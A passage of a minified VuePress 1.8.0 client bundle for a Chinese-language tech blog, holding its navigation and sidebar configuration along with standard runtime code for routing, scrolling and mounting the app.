http://www.webhek.com/post/comparison-sort.html",charsets:{cjk:!0}}],themeConfig:{smoothScroll:!0,nav:[{text:"Home",link:"/"},{text:"Vue",link:"/vue/"},{text:"React",link:"/React/"},{text:"Javascript",link:"/Javascript/"},{text:"数据结构",link:"/数据结构/"},{text:"web",link:"/web/"},{text:"Jenkins",link:"/Jenkins/"},{text:"Docker",link:"/Docker/"},{text:"Linux",link:"/Linux/"},{text:"Summarize",link:"/Summarize/"},{text:"Node",items:[{text:"npm",link:"/Node/npm"},{text:"nvm",link:"/Node/nvm"}]}],sidebar:{"/vue/":[{title:"首页",path:"/vue/",collapsable:!1,sidebarDepth:2},{title:"组件化思想",collapsable:!0,sidebarDepth:2,children:[{title:"Web开发发展史",path:"/vue/组件化思想/Web开发发展史"},{title:"前端开发的四个时代",path:"/vue/组件化思想/前端开发的四个时代"},{title:"开发架构的变迁",path:"/vue/组件化思想/开发架构的变迁"}]},{title:"Vue源码分析",collapsable:!0,sidebarDepth:2,children:[{title:"分析准备",path:"/vue/Vue源码分析/01-分析准备"},{title:"初始化过程",path:"/vue/Vue源码分析/02-初始化过程"}]},{title:"Vue3",collapsable:!0,sidebarDepth:2,children:[{title:"Vue3",path:"/vue/Vue3/01-Vue3"}]}],"/数据结构/":[{title:"首页",path:"/数据结构/",collapsable:!1,sidebarDepth:2},{title:"C语言程序设计",collapsable:!1,sidebarDepth:2,children:[{title:"数据类型",path:"/数据结构/C语言程序设计/00-数据类型"},{title:"运算符与表达式",path:"/数据结构/C语言程序设计/01-运算符与表达式"},{title:"流程结构",path:"/数据结构/C语言程序设计/02-流程结构"},{title:"数组和字符串",path:"/数据结构/C语言程序设计/03-数组和字符串"},{title:"函数",path:"/数据结构/C语言程序设计/04-函数"},{title:"指针",path:"/数据结构/C语言程序设计/05-指针"},{title:"内存管理",path:"/数据结构/C语言程序设计/06-内存管理"},{title:"复合类型",path:"/数据结构/C语言程序设计/07-复合类型"}]},{title:"排序",collapsable:!1,sidebarDepth:2,children:[{title:"基本概念",path:"/数据结构/排序/00-基本概念"},{title:"插入排序",path:"/数据结构/排序/01-插入排序"},{title:"希尔排序",path:"/数据结构/排序/02-希尔排序"},{title:"冒泡排序",path:"/数据结构/排序/03-冒泡排序"},{title:"快速排序",path:"/数据结构/排序/04-快速排序"},{title:"简单排序",path:"/数据结构/排序/05-简单排序"},{title:"堆排序",path:"/数据结构/排序/06-堆排序"},{title:"归并排序",path:"/数据结构/排序/07-归并排序"}]}],"/Javascript/":[{title:"首页",path:"/Javascript/",collapsable:!1,sidebarDepth:2},{title:"Javascript基础语法",collapsable:!0,sidebarDepth:2,children:[{title:"ECMAScript介绍",path:"/Javascript/Javascript基础语法/01-ECMAScript介绍"},{title:"变量与数据类型",path:"/Javascript/Javascript基础语法/02-变量与数据类型"},{title:"运算符",path:"/Javascript/Javascript基础语法/03-运算符"},{title:"流程控制",path:"/Javascript/Javascript基础语法/04-流程控制"},{title:"函数",sidebarDepth:2,children:[{title:"函数声明与调用",path:"/Javascript/Javascript基础语法/05-函数/01-函数声明与调用"},{title:"函数参数与返回值",path:"/Javascript/Javascript基础语法/05-函数/02-函数参数与返回值"},{title:"预解析与作用域",path:"/Javascript/Javascript基础语法/05-函数/03-预解析与作用域"},{title:"函数高级",path:"/Javascript/Javascript基础语法/05-函数/04-函数高级"},{title:"内置顶层函数",path:"/Javascript/Javascript基础语法/05-函数/05-内置顶层函数"},{title:"数据类型转换",path:"/Javascript/Javascript基础语法/05-函数/06-数据类型转换"}]},{title:"数组",sidebarDepth:2,children:[{title:"Iterator",path:"/Javascript/Javascript基础语法/06-数组/Iterator"},{title:"数组",path:"/Javascript/Javascript基础语法/06-数组/数组"}]},{title:"对象",sidebarDepth:2,children:[{title:"对象详情",path:"/Javascript/Javascript基础语法/07-对象/01-对象详情"},{title:"对象的特性",path:"/Javascript/Javascript基础语法/07-对象/02-对象的特性"},{title:"class",path:"/Javascript/Javascript基础语法/07-对象/03-class"},{title:"面向对象编程",path:"/Javascript/Javascript基础语法/07-对象/04-面向对象编程"},{title:"Object对象",path:"/Javascript/Javascript基础语法/07-对象/05-Object对象"},{title:"Math对象",path:"/Javascript/Javascript基础语法/07-对象/06-Math对象"},{title:"String对象",path:"/Javascript/Javascript基础语法/07-对象/07-String对象"},{title:"Array对象",path:"/Javascript/Javascript基础语法/07-对象/08-Array对象"},{title:"Date对象",path:"/Javascript/Javascript基础语法/07-对象/09-Date对象"},{title:"正则对象",path:"/Javascript/Javascript基础语法/07-对象/10-正则对象"},{title:"Number对象",path:"/Javascript/Javascript基础语法/07-对象/11-Number对象"}]},{title:"Symbol",path:"/Javascript/Javascript基础语法/08-Symbol"},{title:"Set数据结构",path:"/Javascript/Javascript基础语法/09-Set数据结构"},{title:"Map数据结构",path:"/Javascript/Javascript基础语法/10-Map数据结构"},{title:"ES新特性",path:"/Javascript/Javascript基础语法/11-ES新特性"},{title:"错误调试",sidebarDepth:2,children:[{title:"JavaScript调试工具",path:"/Javascript/Javascript基础语法/12-错误调试/JavaScript调试工具"},{title:"JavaScript错误与异常",path:"/Javascript/Javascript基础语法/12-错误调试/JavaScript错误与异常"},{title:"移动端js调试",path:"/Javascript/Javascript基础语法/12-错误调试/移动端js调试"},{title:"错误处理",path:"/Javascript/Javascript基础语法/12-错误调试/错误处理"}]}]},{title:"JavaScriptBOM操作",collapsable:!0,sidebarDepth:2,children:[{title:"console对象",path:"/Javascript/JavaScriptBOM操作/console对象"},{title:"history对象",path:"/Javascript/JavaScriptBOM操作/history对象"},{title:"location对象",path:"/Javascript/JavaScriptBOM操作/location对象"},{title:"Navigator对象",path:"/Javascript/JavaScriptBOM操作/Navigator对象"},{title:"window对象",path:"/Javascript/JavaScriptBOM操作/window对象"}]},{title:"JavaScriptDOM操作",collapsable:!0,sidebarDepth:2,children:[{title:"DOM",path:"/Javascript/JavaScriptDOM操作/DOM"},{title:"DOM节点",path:"/Javascript/JavaScriptDOM操作/DOM节点"},{title:"JavaScript动画",path:"/Javascript/JavaScriptDOM操作/JavaScript动画"},{title:"事件基础",path:"/Javascript/JavaScriptDOM操作/事件基础"},{title:"事件高级",path:"/Javascript/JavaScriptDOM操作/事件高级"},{title:"元素尺寸位置",path:"/Javascript/JavaScriptDOM操作/元素尺寸位置"},{title:"本地存储",path:"/Javascript/JavaScriptDOM操作/本地存储"},{title:"移动端事件",path:"/Javascript/JavaScriptDOM操作/移动端事件"},{title:"表单操作",path:"/Javascript/JavaScriptDOM操作/表单操作"}]},{title:"Javascript数据处理",collapsable:!0,sidebarDepth:2,children:[{title:"Ajax",sidebarDepth:1,children:[{title:"ajax的封装案例",path:"/Javascript/Javascript数据处理/Ajax/ajax的封装案例"},{title:"ajax的简介和使用",path:"/Javascript/Javascript数据处理/Ajax/ajax的简介和使用"},{title:"同源策略和跨域",path:"/Javascript/Javascript数据处理/Ajax/同源策略和跨域"}]},{title:"async函数",path:"/Javascript/Javascript数据处理/async函数"},{title:"Fetch",path:"/Javascript/Javascript数据处理/Fetch"},{title:"Generator函数",path:"/Javascript/Javascript数据处理/Generator函数"},{title:"Promise",path:"/Javascript/Javascript数据处理/Promise"},{title:"Proxy",path:"/Javascript/Javascript数据处理/Proxy"},{title:"Reflect",path:"/Javascript/Javascript数据处理/Reflect"}]},{title:"Javascript扩展操作",collapsable:!0,sidebarDepth:2,children:[{title:"ESLint 代码检查",path:"/Javascript/Javascript扩展操作/ESLint 代码检查"},{title:"javascript中的MVC",path:"/Javascript/Javascript扩展操作/javascript中的MVC"},{title:"JavaScript垃圾回收机制",path:"/Javascript/Javascript扩展操作/JavaScript垃圾回收机制"},{title:"JavaScript设计模式",path:"/Javascript/Javascript扩展操作/JavaScript设计模式"},{title:"js性能优化",path:"/Javascript/Javascript扩展操作/js性能优化"},{title:"SPA",path:"/Javascript/Javascript扩展操作/SPA"},{title:"VUE实现",path:"/Javascript/Javascript扩展操作/VUE实现"},{title:"WebSocket",path:"/Javascript/Javascript扩展操作/WebSocket"},{title:"严格模式",path:"/Javascript/Javascript扩展操作/严格模式"},{title:"内存管理",path:"/Javascript/Javascript扩展操作/内存管理"},{title:"数据类型检测",path:"/Javascript/Javascript扩展操作/数据类型检测"},{title:"数据结构和算法",path:"/Javascript/Javascript扩展操作/数据结构和算法"},{title:"模块化",path:"/Javascript/Javascript扩展操作/模块化"},{title:"简单vue实现",path:"/Javascript/Javascript扩展操作/简单vue实现"}]},{title:"TypeScript入门",collapsable:!0,sidebarDepth:2,children:[{title:"简介",path:"/Javascript/TypeScript入门/01-简介"},{title:"基础",path:"/Javascript/TypeScript入门/02-基础"},{title:"进阶",path:"/Javascript/TypeScript入门/03-进阶"}]}],"/web/":[{title:"web",path:"/web/",collapsable:!1,sidebarDepth:2},{title:"web介绍",collapsable:!0,sidebarDepth:2,children:[{title:"Web发展史",path:"/web/web介绍/Web发展史"}]},{title:"HtmlCss",collapsable:!0,sidebarDepth:2,children:[{title:"HtmlCss",path:"/web/HtmlCss/HtmlCss"}]}],"/Jenkins/":[{title:"Jenkins",path:"/Jenkins/",collapsable:!0,sidebarDepth:2}],"/Docker/":[{title:"Docker",path:"/Docker/",collapsable:!0,sidebarDepth:2}],"/Linux/":[{title:"Linux",path:"/Linux/",collapsable:!0,sidebarDepth:2}],"/Node/":[{title:"Node",path:"/Node/",collapsable:!1,sidebarDepth:2,children:[{title:"npm",path:"/Node/npm"},{title:"nvm",path:"/Node/nvm"}]},{title:"Egg",collapsable:!1,sidebarDepth:2,children:[{title:"Egg",path:"/Node/Egg/Egg"},{title:"jwt",path:"/Node/Egg/jwt"},{title:"Sequelize",path:"/Node/Egg/Sequelize"}]}],"/React/":[{title:"首页",path:"/React/",collapsable:!1,sidebarDepth:2},{title:"React介绍",collapsable:!0,sidebarDepth:2,children:[{title:"Babel",path:"/React/React介绍/Babel"},{title:"React环境搭建",path:"/React/React介绍/React环境搭建"},{title:"React简介",path:"/React/React介绍/React简介"},{title:"一分钟上手React",path:"/React/React介绍/一分钟上手React"}]},{title:"React基础",collapsable:!0,sidebarDepth:2,children:[{title:"React元素",path:"/React/React基础/00-React元素"},{title:"ReactApi",path:"/React/React基础/01-ReactApi"},{title:"ReactJSX",path:"/React/React基础/02-ReactJSX"},{title:"React样式",path:"/React/React基础/04-React样式"},{title:"React元素属性",path:"/React/React基础/05-React元素属性"},{title:"DOM操作",path:"/React/React基础/06-DOM操作"},{title:"React事件",path:"/React/React基础/07-React事件"},{title:"生命周期",path:"/React/React基础/08-生命周期"},{title:"React组件组合",path:"/React/React基础/09-React组件组合"},{title:"React组件沟通",path:"/React/React基础/10-React组件沟通"},{title:"React表单",path:"/React/React基础/11-React表单"},{title:"react动画",path:"/React/React基础/12-react动画"}]},{title:"React路由",collapsable:!0,sidebarDepth:2,children:[{title:"ReactRouter介绍",path:"/React/React路由/01-ReactRouter介绍"},{title:"ReactRouter安装",path:"/React/React路由/02-ReactRouter安装"},{title:"ReactRouter组件",path:"/React/React路由/03-ReactRouter组件"},{title:"ReactRouter对象",path:"/React/React路由/04-ReactRouter对象"},{title:"ReactRouter示例",path:"/React/React路由/05-ReactRouter示例"},{title:"ReactRouter项目案例",path:"/React/React路由/06-ReactRouter项目案例"},{title:"编程式路由导航",path:"/React/React路由/07-编程式路由导航"},{title:"ReactRouter问题",path:"/React/React路由/08-ReactRouter问题"},{title:"前端路由原理",path:"/React/React路由/09-前端路由原理"}]},{title:"React项目",collapsable:!0,sidebarDepth:2,children:[{title:"高阶组件",path:"/React/React项目/01-高阶组件"},{title:"React权限控制",path:"/React/React项目/02-React权限控制"},{title:"React错误处理",path:"/React/React项目/03-React错误处理"},{title:"React开发技术",path:"/React/React项目/04-React开发技术"},{title:"React项目环境搭建",path:"/React/React项目/05-React项目环境搭建"},{title:"React项目目录结构",path:"/React/React项目/06-React项目目录结构"}]},{title:"Redux",collapsable:!0,sidebarDepth:2,children:[{title:"状态管理",path:"/React/Redux/01-状态管理"},{title:"Redux介绍",path:"/React/Redux/02-Redux介绍"},{title:"Redux安装",path:"/React/Redux/03-Redux安装"},{title:"Redux使用",path:"/React/Redux/04-Redux使用"},{title:"Redux-thunk",path:"/React/Redux/05-Redux-thunk"},{title:"react-redux",path:"/React/Redux/06-react-redux"},{title:"Redux中间件",path:"/React/Redux/07-Redux中间件"},{title:"ReactRedux工作流程",path:"/React/Redux/08-ReactRedux工作流程"}]},{title:"React扩展",collapsable:!0,sidebarDepth:2,children:[{title:"扩展",path:"/React/React扩展/01-扩展"}]}],"/Summarize/":[{title:"Summarize",path:"/Summarize/",collapsable:!1,sidebarDepth:1}]},sidebarDepth:2},locales:{"/":{lang:"zh-CN",title:"lwz blog",description:"一个基于vuepress的技术站点",path:"/"}}};t(318);Ca.component("footerdata",(function(){return Promise.all([t.e(0),t.e(3)]).then(t.bind(null,392))})),Ca.component("Badge",(function(){return Promise.all([t.e(0),t.e(4)]).then(t.bind(null,546))})),Ca.component("CodeBlock",(function(){return Promise.all([t.e(0),t.e(5)]).then(t.bind(null,393))})),Ca.component("CodeGroup",(function(){return Promise.all([t.e(0),t.e(6)]).then(t.bind(null,394))}));t(319),t(320);t(321);var Il={name:"BackToTop",props:{threshold:{type:Number,default:300}},data:function(){return{scrollTop:null}},computed:{show:function(){return this.scrollTop>this.threshold}},mounted:function(){var n=this;this.scrollTop=this.getScrollTop(),window.addEventListener("scroll",bl()((function(){n.scrollTop=n.getScrollTop()}),100))},methods:{getScrollTop:function(){return window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0},scrollToTop:function(){window.scrollTo({top:0,behavior:"smooth"}),this.scrollTop=0}}},Rl=(t(322),Object(wl.a)(Il,(function(){var n=this.$createElement,e=this._self._c||n;return e("transition",{attrs:{name:"fade"}},[this.show?e("svg",{staticClass:"go-to-top",attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 49.484 28.284"},on:{click:this.scrollToTop}},[e("g",{attrs:{transform:"translate(-229 -126.358)"}},[e("rect",{attrs:{fill:"currentColor",width:"35",height:"5",rx:"2",transform:"translate(229 151.107) rotate(-45)"}}),this._v(" "),e("rect",{attrs:{fill:"currentColor",width:"35",height:"5",rx:"2",transform:"translate(274.949 154.642) rotate(-135)"}})])]):this._e()])}),[],!1,null,"5fd4ef0c",null).exports),zl=[{},function(n){n.Vue.mixin({computed:{$dataBlock:function(){return this.$options.__data__block__}}})},{},{},function(n){var e=n.Vue;n.router.options.scrollBehavior=function(n,t,r){if(r)return window.scrollTo({top:r.y,behavior:"smooth"});if(n.hash){if(e.$vuepress.$get("disableScrollBehavior"))return!1;var a=document.querySelector(n.hash);return!!a&&window.scrollTo({top:(o=a,i=document.documentElement,l=i.getBoundingClientRect(),s=o.getBoundingClientRect(),{x:s.left-l.left,y:s.top-l.top}).y,behavior:"smooth"})}return window.scrollTo({top:0,behavior:"smooth"});var o,i,l,s}},function(n){n.Vue.component("BackToTop",Rl)},function(n){n.Vue.component("CodeCopy",jl)}],Cl=["BackToTop"];t(182);function Dl(n,e){if(!(n instanceof e))throw new TypeError("Cannot call a class as a function")}t(101);function Ol(n,e){for(var t=0;t<e.length;t++){var r=e[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(n,r.key,r)}}function Jl(n,e,t){return e&&Ol(n.prototype,e),t&&Ol(n,t),n}t(173);function Ml(n,e){return(Ml=Object.setPrototypeOf||function(n,e){return n.__proto__=e,n})(n,e)}t(174);function Pl(n){return(Pl=Object.setPrototypeOf?Object.getPrototypeOf:function(n){return n.__proto__||Object.getPrototypeOf(n)})(n)}t(116),t(107);function _l(n,e){return!e||"object"!==ki(e)&&"function"!=typeof e?function(n){if(void 0===n)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return n}(n):e}function Fl(n){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Date.prototype.toString.call(Reflect.construct(Date,[],(function(){}))),!0}catch(n){return!1}}();return function(){var t,r=Pl(n);if(e){var a=Pl(this).constructor;t=Reflect.construct(r,arguments,a)}else t=r.apply(this,arguments);return _l(this,t)}}var Nl=function(n){!function(n,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");n.prototype=Object.create(e&&e.prototype,{constructor:{value:n,writable:!0,configurable:!0}}),e&&Ml(n,e)}(t,n);var e=Fl(t);function t(){return Dl(this,t),e.apply(this,arguments)}return t}(function(){function n(){Dl(this,n),this.store=new Ca({data:{state:{}}})}return Jl(n,[{key:"$get",value:function(n){return this.store.state[n]}},{key:"$set",value:function(n,e){Ca.set(this.store.state,n,e)}},{key:"$emit",value:function(){var n;(n=this.store).$emit.apply(n,arguments)}},{key:"$on",value:function(){var n;(n=this.store).$on.apply(n,arguments)}}]),n}());Object.assign(Nl.prototype,{getPageAsyncComponent:Li,getLayoutAsyncComponent:qi,getAsyncComponent:$i,getVueComponent:Wi});var Ll={install:function(n){var e=new Nl;n.$vuepress=e,n.prototype.$vuepress=e}};function ql(n){n.beforeEach((function(e,t,r){if($l(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){var a=e.path.replace(/\/$/,"")+".html";$l(n,a)?r(a):r()}else r();else{var o=e.path+"/",i=e.path+".html";$l(n,i)?r(i):$l(n,o)?r(o):r()}}))}function $l(n,e){return n.options.routes.filter((function(n){return n.path.toLowerCase()===e.toLowerCase()})).length>0}var Wl={props:{pageKey:String,slotKey:{type:String,default:"default"}},render:function(n){var e=this.pageKey||this.$parent.$page.key;return Ui("pageKey",e),Ca.component(e)||Ca.component(e,Li(e)),Ca.component(e)?n(e):n("")}},Hl={functional:!0,props:{slotKey:String,required:!0},render:function(n,e){var t=e.props,r=e.slots;return n("div",{class:["content__".concat(t.slotKey)]},r()[t.slotKey])}},Ul={computed:{openInNewWindowTitle:function(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},Vl=(t(324),t(325),Object(wl.a)(Ul,(function(){var n=this.$createElement,e=this._self._c||n;return e("span",[e("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[e("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),e("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),e("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports);function Gl(){return(Gl=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a,o;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return t="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:Tl.routerBase||Tl.base,ql(r=new ji({base:t,mode:"history",fallback:!1,routes:Sl,scrollBehavior:function(n,e,t){return t||(n.hash?!Ca.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})}})),a={},n.prev=4,n.next=7,Promise.all(zl.filter((function(n){return"function"==typeof n})).map((function(n){return n({Vue:Ca,options:a,router:r,siteData:Tl,isServer:e})})));case 7:n.next=12;break;case 9:n.prev=9,n.t0=n.catch(4),console.error(n.t0);case 12:return o=new Ca(Object.assign(a,{router:r,render:function(n){return n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Cl.map((function(e){return n(e)})))])}})),n.abrupt("return",{app:o,router:r});case 14:case"end":return n.stop()}}),n,null,[[4,9]])})))).apply(this,arguments)}Ca.config.productionTip=!1,Ca.use(ji),Ca.use(Ll),Ca.mixin(function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:Ca;Ai(e),t.$vuepress.$set("siteData",e);var r=n(t.$vuepress.$get("siteData")),a=new r,o=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(a)),i={};return Object.keys(o).reduce((function(n,e){return e.startsWith("$")&&(n[e]=o[e].get),n}),i),{computed:i}}((function(n){return function(){function e(){Dl(this,e)}return Jl(e,[{key:"setPage",value:function(n){this.__page=n}},{key:"$site",get:function(){return n}},{key:"$themeConfig",get:function(){return this.$site.themeConfig}},{key:"$frontmatter",get:function(){return this.$page.frontmatter}},{key:"$localeConfig",get:function(){var n,e,t=this.$site.locales,r=void 0===t?{}:t;for(var a in r)"/"===a?e=r[a]:0===this.$page.path.indexOf(a)&&(n=r[a]);return n||e||{}}},{key:"$siteTitle",get:function(){return this.$localeConfig.title||this.$site.title||""}},{key:"$canonicalUrl",get:function(){var n=this.$page.frontmatter.canonicalUrl;return"string"==typeof n&&n}},{key:"$title",get:function(){var n=this.$page,e=this.$page.frontmatter.metaTitle;if("string"==typeof e)return e;var t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}},{key:"$description",get:function(){var n=function(n){if(n){var e=n.filter((function(n){return"description"===n.name}))[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}},{key:"$lang",get:function(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}},{key:"$localePath",get:function(){return this.$localeConfig.path||"/"}},{key:"$themeLocaleConfig",get:function(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}},{key:"$page",get:function(){return this.__page?this.__page:function(n,e){for(var t=0;t<n.length;t++){var r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}}]),e}()}),Tl)),Ca.component("Content",Wl),Ca.component("ContentSlotsDistributor",Hl),Ca.component("OutboundLink",Vl),Ca.component("ClientOnly",{functional:!0,render:function(n,e){var t=e.parent,r=e.children;if(t._isMounted)return r;t.$once("hook:mounted",(function(){t.$forceUpdate()}))}}),Ca.component("Layout",qi("Layout")),Ca.component("NotFound",qi("NotFound")),Ca.prototype.$withBase=function(n){var e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.8.0",hash:"8dd914f"},function(n){return Gl.apply(this,arguments)}(!1).then((function(n){var e=n.app;n.router.onReady((function(){e.$mount("#app")}))}))}]);